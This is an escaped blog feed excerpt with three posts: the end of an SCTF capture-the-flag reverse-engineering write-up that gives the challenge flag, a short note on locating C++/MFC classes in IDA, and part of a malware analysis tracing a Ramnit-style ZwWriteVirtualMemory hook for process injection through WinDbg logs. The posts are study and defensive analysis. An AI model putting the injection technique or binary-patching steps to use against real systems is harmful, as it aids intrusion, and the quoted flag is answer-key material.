&lt;p&gt;然后就是位置比较，成功了30次之后，就会显示出flag，可是代码中没有啊，习惯了可以f5就f5，所以，乱了很久&lt;br&gt;回到汇编窗口，通过printw找到几处打印，提取字符，通过python打印了一下，妹的乱码，有什么编码问题，不懂：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;flag = [0x7F, 0x1A, 0x64, 0x7F, 0x78, 0x44, 0x5E, 0x50, 0x67, 0x7d, 0x4E, 0x5F, 0x2A, &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        0x64, 0x6D, 0x52, 0x4C, 0x67, 0x72, 0x64, 0x4C, 0x70, 0x44, 0x7C, 0x5F, 0x2A,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        0x48, 0x44, 0x41, 0x1C, 0x61, 0x72, 0x1A, 0x17]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;def printArr(arr):&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    for i in range(0, len(arr)):&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        s += chr(arr[i])&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    print s&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;printArr(flag)&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;没法子，我也不可能玩30分钟，只好暴力解决了，修改了几个比较，成功进入异常处理（请原谅我，看着真是异常处理），注释中是几次暴力修改位置：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;//.text:08049D75 jz      loc_8049EA0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  if ( v11 &amp;amp;&amp;amp; v6 == target_y )//!=text:08049EA6 jnz     loc_8049D7B&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          ++dword_804C3C0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          if ( dword_804C3C0 == 5 * dword_804C3C0 / 5 )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            ++dword_804C3D8;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          if ( dword_804C3C0 == 3 * dword_804C3C0 / 3 )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            ++dword_804C3D4;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          if ( dword_804C3C0 == 30 )//!=.text:08049EFD   jz      loc_8049F94&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            if ( dword_804C3D8 == 6 )//!=text:08049F9B  jnz     loc_8049F03&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;              if ( dword_804C3D4 == 10 )//!=.text:08049FA8 jnz     loc_8049F03&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;              &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                v16 = __cxa_allocate_exception();&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		//执行异常中会调用chk(3)，显示Mission Complete，然后居然没有调用打印flag，&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		//看到有个.text:0804A039 cmp     ds:dword_804C3DC, 3Bh&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		//.text:0804A040 jg      short loc_804A051强制跳转到打印flag&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		//会进入f5没解析成功的代码，最后我都没弄清，是出题人故意的，还是ida能力问题，亦或是我的问题&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                *(_DWORD *)v16 = 0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                __cxa_throw(v16, &amp;amp;_typeinfo_for_int, 0, v17);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;              &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          &amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;ok,终于打印出来了U0NURntzMWduNGxfMXNfZnVubnk6KX0=，base64解码之后SCTF{s1gn4l_1s_funny:)}，做出来还是比较兴奋的&lt;/p&gt;
&lt;h1 id=&quot;4-其他&quot;&gt;&lt;a href=&quot;#4-其他&quot; class=&quot;headerlink&quot; title=&quot;4. 其他&quot;&gt;&lt;/a&gt;&lt;strong&gt;4. 其他&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;其他题目也尝试了很多。&lt;br&gt;re300，算法太绕，晕了，没去弄了，后面提示是三阶魔方，你妹啊，被吓住了，最后也没人做出来&lt;br&gt;re500，又来了个lua虚拟机，额，我再次败退，这次比赛逆向题基本完败，丢人。&lt;br&gt;图片题貌似是两题，用自己知道的各种方式尝试了，无果。&lt;br&gt;web题目，额，我scan了一题，看到了个head attck，然后不会了。&lt;br&gt;pwn题目，好简单，可是，路在何方？求writeup啊。&lt;br&gt;哦，还有两道code的题目，code200在我们努力下，队友提交成功，code400目前还在暴力运算中，明天看看有答案不（求思路，野路子只有暴力破了，也不知道对不）。&lt;br&gt;我想说code500，请问3 3 1是几个意思啊。按我们分析的思路弄出来了，跟我说wrong input！逗我呢啊，要writeup！&lt;/p&gt;
&lt;p&gt;最后总结：&lt;br&gt;太急躁，没思路，最后还是能力问题！&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;1-Misc10&quot;&gt;&lt;a href=&quot;#1-Misc10&quot; class=&quot;headerlink&quot; title=&quot;1. Misc10&quot;&gt;&lt;/a&gt;&lt;strong&gt;1. Misc10&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;xctf优良传统，百度之&lt;br&gt;手持两把锟斤拷，口中疾呼烫烫烫&lt;br&gt;脚踏千朵屯屯屯，笑看万物锘锘锘&lt;br&gt;其实我没提交，队友提交的，应该是这个&lt;/p&gt;
    
    </summary>
    
      <category term="ctf" scheme="http://anhkgg.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="http://anhkgg.github.io/tags/ctf/"/>
    
      <category term="sctf" scheme="http://anhkgg.github.io/tags/sctf/"/>
    
      <category term="writeup" scheme="http://anhkgg.github.io/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>some thing in c++ reverse</title>
    <link href="http://anhkgg.github.io/some-thing-in-c-reverse/"/>
    <id>http://anhkgg.github.io/some-thing-in-c-reverse/</id>
    <published>2014-12-05T09:10:20.000Z</published>
    <updated>2016-07-07T04:29:20.554Z</updated>
    
    <content type="html">&lt;h1 id=&quot;1-工具&quot;&gt;&lt;a href=&quot;#1-工具&quot; class=&quot;headerlink&quot; title=&quot;1. 工具&quot;&gt;&lt;/a&gt;&lt;strong&gt;1. 工具&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;逆向中，在c++类识别中，IDA能够比较好完成一些工作。&lt;br&gt;由于此类经验较少，写上一点自己的总结，不对之处，请指正，或者有更好的经验，请大牛们指导，最好能放点com逆向的经验就更好了。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;2-寻找构造函数&quot;&gt;&lt;a href=&quot;#2-寻找构造函数&quot; class=&quot;headerlink&quot; title=&quot;2. 寻找构造函数&quot;&gt;&lt;/a&gt;&lt;strong&gt;2. 寻找构造函数&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;在分析mfc程序中，很多时候，对应响应函数的查找比较麻烦。比如，注册验证中，无法定位按钮点击之后的响应函数，无法对获取输出函数下断，无法弹框下断。但是可以对控件类下断，比如&lt;br&gt;窗口初始化中，控件初始化，可以对某些控件类进行下断，如CButton::CButton，那么就可以回溯到窗口的构造函数中了。至于如何获取CButton::CButton地址，那就要结合ida（符号文件）之类的的&lt;/p&gt;
&lt;h1 id=&quot;3-虚表&quot;&gt;&lt;a href=&quot;#3-虚表&quot; class=&quot;headerlink&quot; title=&quot;3. 虚表&quot;&gt;&lt;/a&gt;&lt;strong&gt;3. 虚表&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;在窗口的构造函数中，一般会对对象进行初始化，很重要的一个就是虚表指针的初始化，嘿嘿，那么我们就可以到虚表指针一观了，看到了什么，恩，类脱光了衣服（别想歪了），我们可以很方便找到&lt;br&gt;窗口类的各种相应函数了，详细就多说了，各自体会吧&lt;/p&gt;
&lt;h1 id=&quot;4-详细分析&quot;&gt;&lt;a href=&quot;#4-详细分析&quot; class=&quot;headerlink&quot; title=&quot;4. 详细分析&quot;&gt;&lt;/a&gt;&lt;strong&gt;4. 详细分析&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;既然找到了响应函数，那么后续的就是详细的分析了。&lt;/p&gt;
&lt;h1 id=&quot;5-总结&quot;&gt;&lt;a href=&quot;#5-总结&quot; class=&quot;headerlink&quot; title=&quot;5. 总结&quot;&gt;&lt;/a&gt;&lt;strong&gt;5. 总结&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;这只是自己的一点点小小总结，内容较少，希望对大家有点帮助，还是那句话，请大家多交流，多指导。&lt;br&gt;某对于com逆向真是，，，一个字，，，很晕。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;1-工具&quot;&gt;&lt;a href=&quot;#1-工具&quot; class=&quot;headerlink&quot; title=&quot;1. 工具&quot;&gt;&lt;/a&gt;&lt;strong&gt;1. 工具&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;逆向中，在c++类识别中，IDA能够比较好完成一些工作。&lt;br&gt;由于此类经验较少，写上一点自己的总结，不对之处，请指正，或者有更好的经验，请大牛们指导，最好能放点com逆向的经验就更好了。&lt;br&gt;
    
    </summary>
    
      <category term="reverse" scheme="http://anhkgg.github.io/categories/reverse/"/>
    
    
      <category term="reverse" scheme="http://anhkgg.github.io/tags/reverse/"/>
    
      <category term="c++" scheme="http://anhkgg.github.io/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>inject process analyze 2</title>
    <link href="http://anhkgg.github.io/inject-process-analyze%202/"/>
    <id>http://anhkgg.github.io/inject-process-analyze 2/</id>
    <published>2014-11-25T09:45:00.000Z</published>
    <updated>2016-07-07T04:31:16.973Z</updated>
    
    <content type="html">&lt;h1 id=&quot;1-来源&quot;&gt;&lt;a href=&quot;#1-来源&quot; class=&quot;headerlink&quot; title=&quot;1. 来源&quot;&gt;&lt;/a&gt;&lt;strong&gt;1. 来源&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;某次卡饭hips浏览中，看到某高大上进程注入方式(主要是某人头发长)，惊为天人，技术堪称猥琐之王(抬高了？)，额。。。不捧了。&lt;br&gt;前面分析了一种进程注入方法，现在开始分析另外一种貌似更猥琐的方式，貌似说这种技术用在ramnit病毒中，下面这图是大致原理图（&lt;a href=&quot;http://www.pctrojan.com/content/723-virus-blocks-itself&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;引用的&lt;/a&gt;）&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;br&gt;&lt;img src=&quot;/img/it_infection.png&quot; alt=&quot;img&quot;&gt;&lt;br&gt;简单测试了下，CreateProcess时，会多次调用ZwWriteVirtualMemroy，本以为是写入PE文件的，结果没有看到，所有有点不明白，钩住ZwWriteVirtualMemroy怎么用，文章中提到的是这样：&lt;br&gt;The hooked Windows native system service redirects the code execution flow to the module defined in the caller process to perform the code injection routine. The injected code in the new process includes the capability for file infection (Windows executable and HTML files), as well as backdoor and downloader functionalities.&lt;br&gt;大意可能是各位写入进程中一些代码，比如backdoor，downloader，但是就是不明白如何执行起来，所以需要找个样本来学习一下，如何利用&lt;/p&gt;
&lt;h1 id=&quot;2-样本获取&quot;&gt;&lt;a href=&quot;#2-样本获取&quot; class=&quot;headerlink&quot; title=&quot;2. 样本获取&quot;&gt;&lt;/a&gt;&lt;strong&gt;2. 样本获取&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;在卡饭中搜索到了几个可能是ramnit的样本，有两个没有解压密码，气死了，其他的都是upx3.0加壳，妹啊，脱不了啊，最后下了个交desktoplayer.exe，以为没壳了，结果弄了半天还是upx3.0.8，最后，直接OD吧，&lt;br&gt;断了几次CreateProcessA，可以看到创建了iexplorer.exe，但是参数貌似不是CREATE_SUSPENDED（后面才想起，这种方式不用），然后就想直接在ZwWriteVirtualMemory下断，od没法了，转到windbg吧，有了下面的分析&lt;/p&gt;
&lt;h1 id=&quot;3-分析&quot;&gt;&lt;a href=&quot;#3-分析&quot; class=&quot;headerlink&quot; title=&quot;3. 分析&quot;&gt;&lt;/a&gt;&lt;strong&gt;3. 分析&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;首先想到就是直接对zwwritevirtualmemory下断，然后回溯到inject代码中，结果居然会崩。。这。。不过还是找到了inject代码&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;0:000&amp;gt; bp ntdll!zwwritevirtualmemory&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0:000&amp;gt; g&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;(7e8.af4): Break instruction exception - code 80000003 (first chance)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;eax=00960000 ebx=000009c6 ecx=0012f0b0 edx=7c92e4f4 esi=7c92df90 edi=0012f56c&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;eip=00930005 esp=0012f094 ebp=0012f0b4 iopl=0         nv up ei pl nz na pe cy&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00930005 cc              int     3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0:000&amp;gt; g&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;(7e8.af4): Access violation - code c0000005 (first chance)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;First chance exceptions are reported before any exception handling.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;This exception may be expected and handled.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;eax=ba960002 ebx=000009c6 ecx=0012f0b0 edx=7c92e4f4 esi=7c92df90 edi=0012f56c&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;eip=7c92df96 esp=0012f094 ebp=0012f0b4 iopl=0         nv up ei ng nz na po nc&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010282&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ntdll!ZwWriteVirtualMemory+0x6:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7c92df96 0003            add     byte ptr [ebx],al          ds:0023:000009c6=??&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0:000&amp;gt; kn&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; # ChildEBP RetAddr  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00 0012f090 00402a74 ntdll!ZwWriteVirtualMemory+0x6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;WARNING: Stack unwind information not available. Following frames may be wrong.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;01 0012f0b4 7c81a636 image00400000+0x2a74//这里既是调用ZwWriteVirtualMemory的代码&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;02 0012f3ac 7c819da8 kernel32!BasePushProcessParameters+0x281&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;03 0012fe0c 7c81d627 kernel32!CreateProcessInternalW+0x184e&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;04 0012fef8 7c802397 kernel32!CreateProcessInternalA+0x29c&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;05 0012ff30 004013c0 kernel32!CreateProcessA+0x2c&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;06 0012ffb4 00402cda image00400000+0x13c0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;07 0012fff0 00000000 image00400000+0x2cda&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0:000&amp;gt; ub 7c81a636&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;kernel32!BasePushProcessParameters+0x266:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7c81a61b 6a00            push    0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7c81a61d 53              push    ebx&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7c81a61e 56              push    esi&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7c81a61f 8b85ccfdffff    mov     eax,dword ptr [ebp-234h]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7c81a625 ff7048          push    dword ptr [eax+48h]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7c81a628 ffb580fdffff    push    dword ptr [ebp-280h]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7c81a62e 8b350014807c    mov     esi,dword ptr [kernel32!_imp__NtWriteVirtualMemory (7c801400)]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7c81a634 ffd6            call    esi//这里既是调用ZwWriteVirtualMemory的代码&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;对7c81a634 下断，重新加载程序，g&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;0:000&amp;gt; bp 7c81a634&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0:000&amp;gt; g&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ModLoad: 76300000 7631d000   C:\WINDOWS\system32\IMM32.DLL&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ModLoad: 62c20000 62c29000   C:\WINDOWS\system32\LPK.DLL&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ModLoad: 73fa0000 7400b000   C:\WINDOWS\system32\USP10.dll&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ModLoad: 77180000 77283000   C:\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.5512_x-ww_35d4ce83\comctl32.dll&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ModLoad: 5d170000 5d20a000   C:\WINDOWS\system32\comctl32.dll&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;(1ec.1f4): Access violation - code c0000005 (first chance)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;First chance exceptions are reported before any exception handling.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;This exception may be expected and handled.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;eax=00000001 ebx=84493bb9 ecx=7ffdf000 edx=00150608 esi=00150000 edi=84493bb1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;eip=7c98d811 esp=0012fc38 ebp=0012fc98 iopl=0         nv up ei pl zr na pe nc&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ntdll!RtlDebugFreeHeap+0x82:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7c98d811 0fb707          movzx   eax,word ptr [edi]       ds:0023:84493bb1=????&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0:000&amp;gt; g&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Breakpoint 0 hit&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;eax=00960000 ebx=000009c6 ecx=0012f0b0 edx=7c92e4f4 esi=7c92df90 edi=0012f56c&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;eip=7c81a634 esp=0012f0bc ebp=0012f3ac iopl=0         nv up ei pl zr na pe nc&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;kernel32!BasePushProcessParameters+0x27f:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7c81a634 ffd6            call    esi &amp;#123;ntdll!ZwWriteVirtualMemory (7c92df90)&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;确认一下ZwWriteVirtualMemory被hook&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;0:000&amp;gt; u 7c92df90&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ntdll!ZwWriteVirtualMemory:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;*** WARNING: Unable to verify checksum for image00400000&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;*** ERROR: Module load completed but symbols could not be loaded for image00400000&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7c92df90 e9c44aad83      jmp     image00400000+0x2a59 (00402a59)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7c92df95 ba0003fe7f      mov     edx,offset SharedUserData!SystemCallStub (7ffe0300)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7c92df9a ff12            call    dword ptr [edx]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7c92df9c c21400          ret     14h&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7c92df9f 90              nop&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
